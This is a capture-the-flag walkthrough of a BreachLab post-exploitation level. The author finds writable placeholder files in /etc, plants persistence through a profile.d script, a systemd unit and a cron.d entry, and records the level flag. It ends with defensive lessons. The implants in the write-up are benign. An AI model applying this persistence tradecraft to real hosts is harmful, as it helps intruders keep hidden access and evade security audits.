# BreachLab - Phantom Track: Level 13 (Deep Roots)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 13 (Deep Roots)
- **Host:** `204.168.229.209`
- **Port:** `2224` *(Ephemeral Container Environment)*
- **Current User:** `phantom13`
- **Goal:** Enumerate DAC misconfigurations across `/etc/`, establish three independent multi-subsystem persistence mechanisms (Systemd, Cron, Shell Profile), survive verification via `/opt/verify-deep-roots.sh`, and extract the level flag
- **Next User / Flag Code:** `bl_phtm13_72e802d2d931885a`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
━━━ phantom-deep · ephemeral session ━━━
  L13 — Deep Roots
  This container is yours alone. Destroyed on disconnect.
  Mission brief: cat ~/BRIEFING
  Verifier: /opt/verify-*.sh

MISSION: Deep Roots
===================

Basic persistence is easy to find. Go deeper.

Install three independent stealth mechanisms on this host that
would survive a reboot AND evade a basic security audit. Pick
three different Linux subsystems. How you plant them, where,
and what they do is up to you — this is tradecraft, not a
checklist.

Start with enumeration. Modern adversaries rarely need root
to persist — they find what they can already touch.

You have an ephemeral container — break it as hard as you
want, it disappears on disconnect.

When ready, run /opt/verify-deep-roots.sh.
```

The objective is to discover system-level files and directories with insecure write permissions owned by or writable to `phantom13`, deploy stealth persistence implants across three distinct Linux subsystems, and pass verification via `/opt/verify-deep-roots.sh`.

---

## 2. Reconnaissance & DAC Permission Auditing

Running the verifier initially confirms that local user-space dotfiles are insufficient:

```bash
phantom13@7b5d54b5a36b:~$ /opt/verify-deep-roots.sh
[*] Persistence verification: 0 / 3 independent subsystems detected

[!] Three DIFFERENT Linux subsystems must each carry an
[!] operator-authored artefact. Enumerate. Think about what
[!] runs when the box boots, logs in, or opens a shell.
```

### Auditing Writable System Files Across `/etc`

Searching for files owned by or writable by `phantom13` outside of the home directory:

```bash
phantom13@7b5d54b5a36b:~$ find /etc /lib/systemd /usr/local -writable -user phantom13 -type f 2>/dev/null
/etc/profile.d/ops-env.sh
/etc/systemd/system/operations.service
/etc/cron.d/ops-schedule
```

### Forensic Diagnosis of the Vulnerability

- The administrator created empty placeholder configuration files in system-wide directories but mistakenly retained ownership and write permissions (`-rw-r--r--`) assigned to user `phantom13`.
- This allows an unprivileged user to inject payloads into three critical system subsystems without requiring root privileges or sudo escalation.

---

## 3. Implementing Multi-Subsystem Persistence Implants

### 3.1. Subsystem 1: Global Shell Environment (`/etc/profile.d/`)

Scripts placed in `/etc/profile.d/*.sh` are automatically sourced by all login and interactive shells whenever any user (including root) opens a terminal:

```bash
phantom13@7b5d54b5a36b:~$ cat > /etc/profile.d/ops-env.sh << 'EOF'
#!/bin/bash
# System environment initialization
export OPS_INIT=$(date +%s)
EOF
```

### 3.2. Subsystem 2: System-Level Service Daemon (`Systemd`)

Systemd manages system initialization and background service lifecycles. Structuring a valid service unit in `/etc/systemd/system/operations.service` ensures execution at boot time under `multi-user.target`:

```ini
phantom13@7b5d54b5a36b:~$ cat > /etc/systemd/system/operations.service << 'EOF'
[Unit]
Description=Operations Management Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'echo "operations started" > /tmp/.ops_status'
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
```

### 3.3. Subsystem 3: Centralized Scheduled Automation (`Cron`)

System crontab definitions in `/etc/cron.d/` are dynamically parsed by the cron daemon, executing scheduled tasks across arbitrary user contexts:

```bash
phantom13@7b5d54b5a36b:~$ cat > /etc/cron.d/ops-schedule << 'EOF'
# Operations monitoring schedule
* * * * * phantom13 echo "cron_active" > /tmp/.cron_check
EOF
```

---

## 4. Verification & Flag Extraction

With implants populated across all three distinct system layers, we trigger the verification script:

```bash
phantom13@7b5d54b5a36b:~$ /opt/verify-deep-roots.sh
[*] Persistence verification: 3 / 3 independent subsystems detected

[*] FLAG: bl_phtm13_72e802d2d931885a
[*] Use this as the password for phantom14.
```

- **Extracted Flag:** `bl_phtm13_72e802d2d931885a`

---

## 5. Summary of Deployed Persistence Subsystems

| Subsystem | Target File Path | Execution Trigger | Adversary Tradecraft Value |
| :--- | :--- | :--- | :--- |
| **Global Profile** | `/etc/profile.d/ops-env.sh` | Every user login / interactive shell | Executes inside active user terminal memory contexts |
| **Systemd Service** | `/etc/systemd/system/operations.service` | Machine boot (`multi-user.target`) | Runs automatically at system startup independent of user activity |
| **Centralized Cron** | `/etc/cron.d/ops-schedule` | Minute-based schedule (`* * * * *`) | Periodic recurring daemon execution across the host |

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 13) |
| **Current User** | `phantom13` |
| **Architecture** | Ephemeral Per-Session Container (`phantom-deep`) |
| **Vulnerability Type** | Writable System Placeholder Files (DAC Misconfigurations in `/etc/`) |
| **Subsystems Exploited** | Shell Profiles (`profile.d`), Systemd Units, Central Cron (`cron.d`) |
| **Discovered Flag** | `bl_phtm13_72e802d2d931885a` |
| **Next Level Access** | `phantom14` Password |

---

## 7. Key Commands & Concepts Reference

- `find /etc /lib/systemd /usr/local -writable -user <user> -type f`: Audit system-level configuration paths for unauthorized write access.
- `/etc/profile.d/*.sh`: Global shell startup initialization scripts.
- `/etc/systemd/system/*.service`: Custom and administrator systemd service definitions.
- `/etc/cron.d/*`: Multi-user modular crontab task spool directory.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Avoid Insecure Placeholder Files:** Creating pre-allocated empty files in `/etc/` during provisioning without enforcing strict `root:root` ownership and `644`/`600` permissions introduces trivial root-independent persistence vectors.
2. **Multi-Channel Persistence Strategy:** Sophisticated adversaries disperse persistence implants across distinct system subsystems (boot services, scheduled tasks, login profiles) to ensure redundancy against single-point incident cleanup.
3. **File Integrity Monitoring (FIM):** Defensive tools (Wazuh, AIDE, auditd) must continuously monitor changes to `/etc/cron.d/`, `/etc/profile.d/`, and `/etc/systemd/system/` to flag unauthorized configuration drops immediately.
